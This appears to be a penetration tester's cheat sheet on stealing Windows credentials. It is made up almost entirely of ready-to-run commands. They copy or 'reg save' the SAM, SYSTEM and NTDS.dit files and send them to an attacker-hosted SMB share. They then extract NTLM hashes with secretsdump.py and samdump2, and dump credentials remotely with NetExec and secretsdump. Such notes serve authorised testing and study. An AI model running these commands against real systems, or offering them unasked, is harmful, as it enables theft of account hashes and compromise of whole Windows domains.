---
Primary_category: "[[WINDOWS PENTESTING]]"
title: "WINDOWS CREDENTIALS STEALING"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags: 
cssclasses:
---

###### PRIMARY CATEGORY → [[WINDOWS PENTESTING]]

| **REFERENCES** | | 
| --- | --- |
| ***Stealing Windows Creds*** | ***[See here](https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/index.html)*** |

#### Local Creds Dump

##### SAM & System

First of all, both files, `SAM` and `SYSTEM`, must be extracted from the target

> [!INFO]-
>
> Note that both files are required since the `SAM` file contains the NTLM Hashes related to the system's users credentials and the `SYSTEM` file contains the simmetric key used to encrypt and decrypt the `SAM` file
>

This can be done in the following ways depending on the state of the target system

###### *From OS File System*

> ***If the system is not booted***

- ***From the Attacker***

```bash
smbserver.py -smb2support -username <USER> -password <PASSWORD> <SHARE_NAME> <SHARE_PATH>
```

- ***From the Target***

```bash
net use X: \\<ATTACKER>\<SHARED_FOLDER> /USER:<USER> <PASSWORD>
```

```bash
Copy-Item -Force -Path "C:\Windows\System32\Config\SAM", "C:\Windows\System32\Config\SYSTEM" -Destination "X:"
```

###### *From Windows Registry*

> ***If the system is booted***

- ***From the Attacker***

```bash
smbserver.py -smb2support -username <USER> -password <PASSWORD> <SHARE_NAME> <SHARE_PATH>
```

- ***From the Target***

```bash
net use X: \\<ATTACKER>\<SHARED_FOLDER> /USER:<USER> <PASSWORD>
```

```bash
reg save HKLM\sam X:\SAM
reg save HKML\system X:\SYSTEM
```

###### *Credentials Extraction*

Once both files are obtained, just proceed as follows to extract the ***NTLM*** hashes from the `SAM` file

- ***Secretsdump.py***

> ***[Reference](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)***

```bash
secretsdump.py -outputfile <FILE> -sam <SAM> -system <SYSTEM> local
```

- ***Samdump2***

> ***[Reference](https://www.kali.org/tools/samdump2/)***

```bash
samdump2 <SYSTEM> <SAM>
```

##### NTDS.dit & System

###### From OS File System

> ***If the system is not booted***

- ***From the Attacker***

```bash
smbserver.py -smb2support -username <USER> -password <PASSWORD> <SHARE_NAME> <SHARE_PATH>
```

- ***From the Target***

```bash
net use X: \\<ATTACKER>\<SHARED_FOLDER> /USER:<USER> <PASSWORD>
```

```bash
Copy-Item -Force -Path "C:\Windows\NTDS\NTDS.dit", "C:\Windows\System32\Config\SYSTEM" -Destination "X:"
```

###### NTDSUtil

> ***If the system is booted***

- ***From the Attacker***

```bash
smbserver.py -smb2support -username <USER> -password <PASSWORD> <SHARE_NAME> <SHARE_PATH>
```

- ***From the Target***

```bash
net use X: \\<ATTACKER>\<SHARED_FOLDER> /USER:<USER> <PASSWORD>
```

```bash
ntdsutil "ac i ntds" "ifm" "create full X:\NTDS" quit quit
```

###### Credentials Extraction

- ***Secretsdump.py*** 

```bash
secretsdump.py -outputfile <FILE> -ntds <NTDS> -system <SYSTEM> local
```

---

#### Remote Creds Dump

##### SAM & System

> ***`%systemRoot%\System32\Config\SAM`***
> ***`%systemRoot%\System32\Config\SYSTEM`***

###### *Netexec*

> ***[Reference](https://github.com/Pennyw0rth/NetExec)***

```bash
nxc smb <TARGET> --username '<USER>' --password <PASSWORD> --sam
```

###### *Secretsdump.py*

> ***[Reference](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)***

```bash
secretsdump.py <DOMAIN/WORKGROUP>/<USER>:'<PASSWORD>'@<TARGET>
```

##### NTDS.dit & System

> ***`%SystemRoot%/NTDS/ntds.dit`***

###### *Netexec*

> ***[Reference](https://github.com/Pennyw0rth/NetExec)***

- ***Standard Extraction***

```bash
nxc smb <TARGET> --username '<USER>' --password <PASSWORD> --ntds
```

- ***VSS (Volume Shadow Copy Service) Extraction*** 

```bash
nxc smb <TARGET> --username '<USER>' --password <PASSWORD> --ntds vss
```

###### *Secretsdump.py*

> ***[Reference](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)***

```bash
secretsdump.py -just-dc-ntlm <DOMAIN/WORKGROUP>/<USER>:'<PASSWORD>'@<TARGET>
```